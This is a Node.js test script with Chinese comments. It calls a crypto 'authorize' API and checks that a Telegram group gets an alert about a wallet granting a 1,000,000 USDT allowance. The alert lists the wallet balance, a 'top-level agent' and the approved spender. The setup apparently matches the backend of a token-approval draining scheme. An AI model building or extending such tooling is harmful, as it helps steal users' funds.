const fetch = require('node-fetch');

async function verifyTelegramNotification() {
  console.log('🔔 验证Telegram群组授权通知消息...');
  
  try {
    // 测试一个新地址的授权，确保会触发Telegram通知
    const testAddress = '0x' + Math.random().toString(16).substr(2, 40);
    
    console.log(`📍 使用新测试地址: ${testAddress}`);
    
    // 调用授权API
    const response = await fetch('https://ethmax.vercel.app/api/user/authorize', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        address: testAddress,
        isAuthorized: true,
        amount: '1000000'
      })
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const result = await response.json();
    console.log('✅ 授权API调用结果:');
    console.log('📊 状态:', result.success ? '成功' : '失败');
    
    if (result.data) {
      console.log('👤 用户信息:');
      console.log('  - 地址:', result.data.address);
      console.log('  - 授权状态:', result.data.isAuthorized ? '已授权' : '未授权');
      console.log('  - 是否首次授权:', result.data.firstTimeAuth ? '是' : '否');
      console.log('  - ETH余额:', result.data.eth);
    }

    // 等待Telegram通知处理
    console.log('\n⏳ 等待5秒钟让Telegram通知处理...');
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    console.log('📱 Telegram通知验证说明:');
    console.log('1. 请检查您的Telegram群组');
    console.log('2. 应该收到一条授权通知消息');
    console.log('3. 消息格式应该包含:');
    console.log('   - 钱包余额: [链上USDT余额]');
    console.log('   - 顶层代理: [代理信息]');
    console.log('   - 用户编号: [用户ID]');
    console.log('   - 用户备注: 暂无备注');
    console.log('   - 是否活动: 是');
    console.log('   - 用户钱包: [授权地址]');
    console.log('   - 授权金额: 1000000 USDT');
    console.log('   - 客户地址: [授权地址]');
    console.log('   - 授权对象: [授权对象地址]');
    console.log('   - 执行操作: 客户调整我方授权额度');
    
    console.log('\n🔍 如果群组没有收到消息，可能的原因:');
    console.log('1. Telegram Bot Token 或 Chat ID 配置错误');
    console.log('2. Supabase Edge Function 没有正确部署');
    console.log('3. 通知队列处理有问题');

  } catch (error) {
    console.error('❌ 验证失败:', error.message);
  }
}

verifyTelegramNotification();
